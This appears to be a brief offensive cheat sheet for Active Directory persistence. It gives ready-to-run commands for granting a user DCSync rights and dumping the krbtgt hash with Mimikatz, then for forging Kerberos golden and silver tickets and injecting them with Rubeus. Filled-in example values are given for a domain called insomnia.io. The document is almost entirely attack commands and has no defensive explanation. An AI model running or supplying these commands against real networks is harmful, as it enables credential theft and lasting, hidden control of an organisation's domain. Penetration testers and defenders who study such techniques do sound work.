### DCSync Backdoor

 On Domain admin privilege Console 
```

 PowerShell Add-DomainObjectAcl -TargetIdentity 'DC=insomnia,DC=io' -PrincipalIdentity 'r.meyer' -Rights DCSync 
 ```
 On Local Admin privilege Console
 ```

 lsadump::dcsync /user:krbtgt /domain:insomnia.io
```
### Golden Tickets
```
kerberos::golden /user:<> /domain:<> /sid:<> /krbtgt:<> /ticket:golden.kirbi

kerberos::golden /user:Administrator /domain:insomnia.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /krbtgt:REDACTED /ticket:golden.kirbi

[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi"))

Rubeus ptt /ticket:[...snip...]
```
### Silver Tickets
```
kerberos::golden /user:<> /domain:<> /sid:<> /target:<> /service:<> /rc4:<> /ticket:silver.kirbi

 kerberos::golden /user:Administrator /domain:insomnia.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc-1.insomnia.io /service:cifs /rc4:REDACTED /ticket:silver.kirbi
 
 [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\silver.kirbi"))
 
 Rubeus ptt /ticket:[...snip...]
```
